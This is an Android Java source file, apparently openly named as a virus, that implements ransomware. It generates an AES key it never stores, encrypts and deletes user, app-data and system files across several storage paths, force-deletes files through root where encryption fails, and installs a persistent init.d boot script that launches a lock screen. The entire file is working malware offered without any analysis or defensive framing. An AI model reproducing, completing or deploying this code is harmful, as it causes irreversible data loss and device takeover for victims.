package com.real.virus;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.io.*;
import java.security.SecureRandom;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends Activity {

    private static final String TAG = "REAL_VIRUS";
    private static final String ENC_EXT = ".rv";
    private static final int REQ = 1001;

    private static final String[] TARGETS = {
        "/sdcard/",
        "/storage/emulated/0/",
        "/data/data/",
        "/data/media/0/",
        "/system/etc/"
    };

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Button btn = new Button(this);
        btn.setText("START");
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestPerms();
            }
        });
        setContentView(btn);
    }

    private void requestPerms() {
        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
            }, REQ);
        } else {
            startEncrypt();
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] p, int[] r) {
        super.onRequestPermissionsResult(code, p, r);
        if (code == REQ) startEncrypt();
    }

    private void startEncrypt() {
        Toast.makeText(this, "START", Toast.LENGTH_SHORT).show();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Запрос root
                    boolean rooted = checkRoot();
                    Log.i(TAG, "root: " + rooted);

                    byte[] key = genKey();
                    for (String t : TARGETS) encryptDir(new File(t), key);
                    installInitd();
                    Log.i(TAG, "DONE");
                } catch (Exception e) {
                    Log.e(TAG, "ERR: " + e.toString());
                }
            }
        }).start();
    }

    private boolean checkRoot() {
        try {
            Process p = Runtime.getRuntime().exec("su -c id");
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = br.readLine();
            br.close();
            return line != null && line.contains("uid=0");
        } catch (Exception e) {
            return false;
        }
    }

    private byte[] genKey() throws Exception {
        KeyGenerator kg = KeyGenerator.getInstance("AES");
        kg.init(256, new SecureRandom());
        SecretKey sk = kg.generateKey();
        return sk.getEncoded();
    }

    private void encryptDir(File d, byte[] k) {
        if (d == null || !d.exists()) return;
        File[] fs = d.listFiles();
        if (fs == null) return;
        for (File f : fs) {
            if (f.isDirectory()) encryptDir(f, k);
            else encryptFile(f, k);
        }
    }

    private void encryptFile(File f, byte[] k) {
        try {
            if (f.getName().endsWith(ENC_EXT)) return;
            if (f.length() > 50L * 1024 * 1024) return;
            byte[] data = read(f);
            byte[] iv = new byte[12];
            new SecureRandom().nextBytes(iv);
            Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
            c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, "AES"),
                   new GCMParameterSpec(128, iv));
            byte[] enc = c.doFinal(data);
            File out = new File(f.getAbsolutePath() + ENC_EXT);
            FileOutputStream fos = new FileOutputStream(out);
            fos.write(iv);
            fos.write(enc);
            fos.close();
            f.delete();
            Log.i(TAG, "enc: " + f.getAbsolutePath());
        } catch (Exception e) {
            // Попытка через su
            try {
                Runtime.getRuntime().exec(new String[]{
                    "su", "-c", "rm -f '" + f.getAbsolutePath() + "'"
                });
            } catch (Exception ignored) {}
            Log.e(TAG, "fail: " + f.getAbsolutePath() + " " + e.toString());
        }
    }

    private byte[] read(File f) throws Exception {
        FileInputStream fis = new FileInputStream(f);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = fis.read(buf)) != -1) bos.write(buf, 0, n);
        fis.close();
        return bos.toByteArray();
    }

    private void installInitd() {
        try {
            String script = "#!/system/bin/sh\nam start -n com.real.virus/.LockActivity\n";
            Process p = Runtime.getRuntime().exec(new String[]{
                "su", "-c",
                "mount -o rw,remount /system && " +
                "echo '" + script.replace("\n", "\\n") + "' > /system/etc/init.d/99rv && " +
                "chmod 755 /system/etc/init.d/99rv"
            });
            p.waitFor();
            Log.i(TAG, "init.d installed");
        } catch (Exception e) {
            Log.e(TAG, "initd fail: " + e.toString());
        }
    }
}
